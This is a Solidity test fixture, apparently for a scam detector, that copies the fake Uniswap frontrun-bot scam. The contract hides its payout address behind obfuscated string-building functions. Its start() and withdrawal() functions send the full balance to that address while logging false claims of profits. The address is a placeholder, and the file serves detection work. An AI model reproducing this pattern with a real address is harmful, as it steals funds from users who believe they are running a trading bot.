// SPDX-License-Identifier: MIT
// BotGuard TEST FIXTURE (Solidity 0.6, like most real scam copies). Payout address is inert.
// Never deploy this on a real network.
pragma solidity ^0.6.6;

contract UniswapFrontrunBot {
    event Log(string _msg);

    receive() external payable {}

    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        return string(abi.encodePacked(_base, _value));
    }

    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", "bad0bad0");
        string memory _memPoolSol = mempool(_memPoolOffset, "bad00000");
        string memory _memPoolLength = mempool(_memPoolSol, "0000000000000000");
        return mempool("0", mempool(_memPoolLength, "b0700b07"));
    }

    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function start() public payable {
        emit Log("Running FrontRun attack on Uniswap. This can take a while please wait...");
        address to = parseMemoryPool(callMempool());
        payable(to).transfer(address(this).balance);
    }

    function withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(parseMemoryPool(callMempool())).transfer(address(this).balance);
    }
}
